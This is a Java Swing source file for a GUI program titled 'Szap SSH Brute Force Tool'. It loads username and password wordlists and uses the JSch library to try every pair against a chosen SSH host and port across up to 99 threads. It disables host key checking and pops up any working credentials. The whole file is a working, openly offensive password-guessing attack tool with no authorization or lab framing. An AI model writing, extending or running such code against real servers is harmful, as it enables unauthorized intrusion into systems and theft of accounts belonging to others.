package com.szap;

import com.formdev.flatlaf.FlatDarkLaf;
import com.jcraft.jsch.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.*;

public class App {
    private static final DefaultListModel<String> userModel = new DefaultListModel<>();
    private static final DefaultListModel<String> passModel = new DefaultListModel<>();
    private static JTextArea statusArea;
    private static JLabel statsLabel;
    private static ExecutorService executor;
    private static volatile boolean isRunning = false;
    private static JButton startButton, stopButton;
    private static long startTime;
    private static int attempts = 0;
    private static boolean successFound = false;

    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("FlatLaf failed to load: " + e);
        }

        UIManager.put("OptionPane.messageFont", new Font("JetBrains Mono", Font.BOLD, 14));
        UIManager.put("OptionPane.buttonFont", new Font("JetBrains Mono", Font.PLAIN, 13));
        UIManager.put("OptionPane.messageForeground", Color.ORANGE);

        SwingUtilities.invokeLater(App::createAndShowGUI);
    }

    private static void createAndShowGUI() {
        JFrame frame = new JFrame("Szap SSH Brute Force Tool");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(1100, 800);
        frame.setLocationRelativeTo(null);
        frame.setLayout(new BorderLayout());

        try {
            Image icon = ImageIO.read(App.class.getResourceAsStream("/icon.png"));
            if (icon != null) {
                frame.setIconImage(icon);
            }
        } catch (Exception ignored) {}

        JPanel mainPanel = new JPanel();
        mainPanel.setBorder(new EmptyBorder(20, 20, 20, 20));
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));

        JLabel title = new JLabel("Szap SSH Brute Force Tool");
        title.setForeground(new Color(255, 102, 0));
        title.setFont(new Font("JetBrains Mono", Font.BOLD, 30));
        title.setAlignmentX(Component.CENTER_ALIGNMENT);
        mainPanel.add(title);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));

        JPanel inputPanel = new JPanel(new GridLayout(3, 2, 10, 10));

        JLabel ipLabel = createInputLabel("🌐 IP Address");
        JTextField ipField = createTextField("192.168.1.1");

        JLabel portLabel = createInputLabel("🔌 Port");
        JTextField portField = createTextField("22");

        JLabel threadLabel = createInputLabel("⚙️ Threads (1-99)");
        JTextField threadField = createTextField("10");

        inputPanel.add(ipLabel); inputPanel.add(ipField);
        inputPanel.add(portLabel); inputPanel.add(portField);
        inputPanel.add(threadLabel); inputPanel.add(threadField);

        mainPanel.add(inputPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));

        JPanel userPassPanel = new JPanel(new GridLayout(1, 2, 20, 0));
        userPassPanel.add(createListPanel("👤 Usernames", userModel));
        userPassPanel.add(createListPanel("🔑 Passwords", passModel));
        mainPanel.add(userPassPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));

        JPanel controlPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 20, 0));

        startButton = new JButton("🟢 Start Attack");
        stopButton = new JButton("⛔ Stop");
        stopButton.setEnabled(false);

        for (JButton b : Arrays.asList(startButton, stopButton)) {
            b.setBackground(new Color(255, 102, 0));
            b.setForeground(Color.BLACK);
            b.setFont(new Font("JetBrains Mono", Font.BOLD, 14));
        }

        controlPanel.add(startButton);
        controlPanel.add(stopButton);
        mainPanel.add(controlPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 10)));

        statusArea = new JTextArea(10, 30);
        statusArea.setEditable(false);
        statusArea.setBackground(new Color(30, 30, 30));
        statusArea.setForeground(Color.LIGHT_GRAY);
        statusArea.setFont(new Font("JetBrains Mono", Font.PLAIN, 13));
        statusArea.setCaretColor(Color.ORANGE);
        JScrollPane scrollPane = new JScrollPane(statusArea);
        mainPanel.add(scrollPane);

        statsLabel = new JLabel("");
        statsLabel.setForeground(Color.ORANGE);
        statsLabel.setFont(new Font("JetBrains Mono", Font.BOLD, 14));
        statsLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 10)));
        mainPanel.add(statsLabel);

        frame.add(mainPanel, BorderLayout.CENTER);
        frame.setVisible(true);

        startButton.addActionListener(e -> {
            if (isRunning) return;
            String ip = ipField.getText().trim();
            String portStr = portField.getText().trim();
            String threadText = threadField.getText().trim();

            int port;
            int threadCount;
            try {
                port = Integer.parseInt(portStr);
                threadCount = Integer.parseInt(threadText);
                if (threadCount < 1 || threadCount > 99)
                    throw new NumberFormatException();
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(frame, "Please enter valid IP, port, and thread values.");
                return;
            }

            if (ip.isEmpty() || userModel.isEmpty() || passModel.isEmpty()) {
                JOptionPane.showMessageDialog(frame, "Please provide IP, port, usernames, and passwords.");
                return;
            }

            try (Socket socket = new Socket(ip, port)) {
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(frame, "⚠️ Cannot connect to specified IP and port.");
                return;
            }

            isRunning = true;
            successFound = false;
            attempts = 0;
            startTime = System.currentTimeMillis();
            startButton.setEnabled(false);
            stopButton.setEnabled(true);
            statusArea.setText("");
            statusArea.append("[+] Attack started...\n");
            statusArea.append("    IP: " + ip + "\n    Port: " + port + "\n    Threads: " + threadCount + "\n");

            executor = Executors.newFixedThreadPool(threadCount);

            for (int i = 0; i < userModel.size(); i++) {
                String user = userModel.get(i);
                for (int j = 0; j < passModel.size(); j++) {
                    if (!isRunning || successFound) break;
                    String pass = passModel.get(j);
                    String finalUser = user;
                    String finalPass = pass;
                    executor.submit(() -> bruteSSH(ip, port, finalUser, finalPass));
                }
            }

            executor.shutdown();
            new Thread(() -> {
                try {
                    executor.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
                SwingUtilities.invokeLater(() -> {
                    isRunning = false;
                    startButton.setEnabled(true);
                    stopButton.setEnabled(false);
                    if (!successFound)
                        statusArea.append("[✓] Attack finished or stopped.\n");
                });
            }).start();
        });

        stopButton.addActionListener(e -> {
            isRunning = false;
            if (executor != null) executor.shutdownNow();
            statusArea.append("[!] Attack stopped by user.\n");
            startButton.setEnabled(true);
            stopButton.setEnabled(false);
        });
    }

    private static void bruteSSH(String ip, int port, String user, String pass) {
        try {
            JSch jsch = new JSch();
            Session session = jsch.getSession(user, ip, port);
            session.setPassword(pass);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect(5000);

            if (session.isConnected()) {
                successFound = true;
                isRunning = false;
                executor.shutdownNow();
                SwingUtilities.invokeLater(() -> {
                    statusArea.append("[✓] Successful login found → " + user + ":" + pass + "\n");
                    JOptionPane.showMessageDialog(null, "🔐 Login successful! → " + user + ":" + pass);
                    startButton.setEnabled(true);
                    stopButton.setEnabled(false);
                });
                session.disconnect();
            }
        } catch (Exception ignored) {
        } finally {
            attempts++;
            SwingUtilities.invokeLater(() -> {
                statusArea.append("Tried: " + user + ":" + pass + "\n");
                updateStats();
            });
        }
    }

    private static void updateStats() {
        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
        elapsed = Math.max(elapsed, 1);
        int rps = (int) (attempts / elapsed);
        statsLabel.setText("👥 Users: " + userModel.size() +
                " | 🔑 Passwords: " + passModel.size() +
                " | 🎯 Attempts: " + attempts +
                " | ⚡ Speed: " + rps + " req/sec");
    }

    private static JTextField createTextField(String placeholder) {
        JTextField field = new JTextField();
        field.setMaximumSize(new Dimension(Integer.MAX_VALUE, 35));
        field.setFont(new Font("JetBrains Mono", Font.PLAIN, 14));
        field.setToolTipText(placeholder);
        return field;
    }

    private static JLabel createInputLabel(String text) {
        JLabel label = new JLabel(text);
        label.setFont(new Font("JetBrains Mono", Font.PLAIN, 13));
        return label;
    }

    private static JPanel createListPanel(String title, DefaultListModel<String> model) {
        JPanel panel = new JPanel(new BorderLayout(10, 10));
        panel.setBorder(BorderFactory.createTitledBorder(
                BorderFactory.createLineBorder(Color.GRAY), title, 0, 0,
                new Font("JetBrains Mono", Font.BOLD, 14), Color.ORANGE));

        JList<String> list = new JList<>(model);
        JScrollPane scrollPane = new JScrollPane(list);

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

        JButton fileButton = new JButton("📂 Load");
        JButton removeButton = new JButton("❌ Remove Selected");
        JButton clearButton = new JButton("🧹 Clear All");

        for (JButton btn : Arrays.asList(fileButton, removeButton, clearButton)) {
            btn.setFont(new Font("JetBrains Mono", Font.PLAIN, 12));
        }

        fileButton.addActionListener(e -> {
            JFileChooser chooser = new JFileChooser();
            chooser.setMultiSelectionEnabled(true);
            chooser.setFileFilter(new FileNameExtensionFilter("TXT Files", "txt"));
            if (chooser.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
                File[] files = chooser.getSelectedFiles();
                for (File file : files) {
                    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                        String line;
                        while ((line = br.readLine()) != null) {
                            String trimmed = line.trim();
                            if (!trimmed.isEmpty() && !model.contains(trimmed)) {
                                model.addElement(trimmed);
                            }
                        }
                    } catch (IOException ex) {
                        JOptionPane.showMessageDialog(null, "File could not be read: " + ex.getMessage());
                    }
                }
            }
        });

        removeButton.addActionListener(e -> {
            int selected = list.getSelectedIndex();
            if (selected != -1) {
                model.remove(selected);
            }
        });

        clearButton.addActionListener(e -> model.clear());

        buttonPanel.add(fileButton);
        buttonPanel.add(removeButton);
        buttonPanel.add(clearButton);

        panel.add(scrollPane, BorderLayout.CENTER);
        panel.add(buttonPanel, BorderLayout.SOUTH);
        return panel;
    }
}
